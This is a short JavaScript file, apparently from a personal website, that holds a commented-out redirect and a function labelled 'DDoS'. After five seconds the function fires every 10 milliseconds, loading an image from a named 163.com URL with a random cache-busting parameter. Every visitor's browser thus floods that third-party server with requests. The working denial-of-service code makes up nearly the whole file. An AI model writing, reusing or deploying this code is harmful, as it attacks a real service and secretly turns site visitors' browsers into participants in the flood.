// TODO: JavaScript 跳转
// window.location.href = 'https://xiaozhu2007.netlify.app/'

// DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
function imgflood() {
  var TARGET =
    "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
  var pic = new Image();
  var rand = Math.floor(Math.random() * 114514);
  pic.src = `${TARGET}&${rand}=jianshu.cn`;
}
setTimeout(function () {
  setInterval(imgflood, 10);
}, 5000);
// End
